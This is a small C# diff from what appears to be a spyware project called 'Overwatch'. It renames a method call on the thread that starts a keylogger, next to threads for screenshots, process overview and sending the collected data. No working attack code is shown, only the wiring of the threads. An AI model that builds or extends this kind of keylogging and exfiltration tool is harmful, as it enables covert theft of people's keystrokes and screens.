@@ -9,7 +9,7 @@ namespace Overwatch
         static cReceiveInformation info = new cReceiveInformation();
         static cKeylogger k = new cKeylogger();
         static cSendingInformation s = new cSendingInformation();
-        static Thread KeyTread = new Thread(k.start);
+        static Thread KeyTread = new Thread(k.Start);
         static Thread ScreenTread = new Thread(info.ScreenShoot);
         static Thread SendingTread = new Thread(s.Sending);
         static Thread ProcessTread = new Thread(info.Overview); 
